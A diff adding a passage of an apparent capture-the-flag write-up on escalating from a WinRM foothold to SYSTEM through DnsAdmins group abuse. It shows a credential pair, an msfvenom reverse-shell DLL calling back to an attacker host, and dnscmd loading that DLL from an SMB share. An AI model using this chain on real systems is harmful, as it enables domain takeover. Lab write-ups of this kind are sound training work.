@@ -458,4 +458,175 @@ Using the credentials `ryan:Serv3r4Admin4cc123!`, a WinRM session was successful
 # Privilege escalation
 ## Enumeration
 ```
+*Evil-WinRM* PS C:\Users\ryan> gci -recurse
+
+
+    Directory: C:\Users\ryan
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        12/3/2019   7:34 AM                Desktop
+d-r---        9/27/2019   4:22 PM                Documents
+d-r---        7/16/2016   6:18 AM                Downloads
+d-r---        7/16/2016   6:18 AM                Favorites
+d-r---        7/16/2016   6:18 AM                Links
+d-r---        7/16/2016   6:18 AM                Music
+d-r---        7/16/2016   6:18 AM                Pictures
+d-----        7/16/2016   6:18 AM                Saved Games
+d-r---        7/16/2016   6:18 AM                Videos
+
+
+    Directory: C:\Users\ryan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        12/3/2019   7:34 AM            155 note.txt
+
+
+*Evil-WinRM* PS C:\Users\ryan> cd Desktop
+ls
+*Evil-WinRM* PS C:\Users\ryan\Desktop> ls
+
+
+    Directory: C:\Users\ryan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        12/3/2019   7:34 AM            155 note.txt
+
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> 
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ==============================================
+megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
 ```
+
+During enumeration, I checked Ryan's Desktop directory and found `note.txt`. I wasn't sure what it meant, so I skipped it for the time being. I then reviewed the user's full information and discovered that Ryan is a member of the DnsAdmins group.
+
+---
+## DnsAdmins Group Abuse
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.107 LPORT=443 -f dll -o rev.dll        
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: rev.dll
+
+
+impacket-smbserver share . -smb2support -debug
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[*] Config file parsed
+[+] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[+] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd /config /serverlevelplugindll \\10.10.14.107\share\rev.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1704
+        FLAGS              :
+
+```
+
+I found a useful article describing how to escalate privileges from the DnsAdmins group to NT AUTHORITY\SYSTEM ([link](https://medium.com/@parvezahmad90/windows-privilege-escalation-dns-admin-to-nt-authority-system-step-by-step-945fe2a094dc)). 
+
+First, a malicious DLL was generated and an SMB server was started on the attacker machine. Using the `dnscmd` utility, the DNS Server service was configured to load the DLL.
+
+```
+C:\Users\Administrator\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D1AC-5AF6
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/04/2019  05:18 AM    <DIR>          .
+12/04/2019  05:18 AM    <DIR>          ..
+11/04/2026  05:59 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   2,473,238,528 bytes free
+```
+After restarting the DNS service, a SYSTEM shell was obtained within a few seconds.
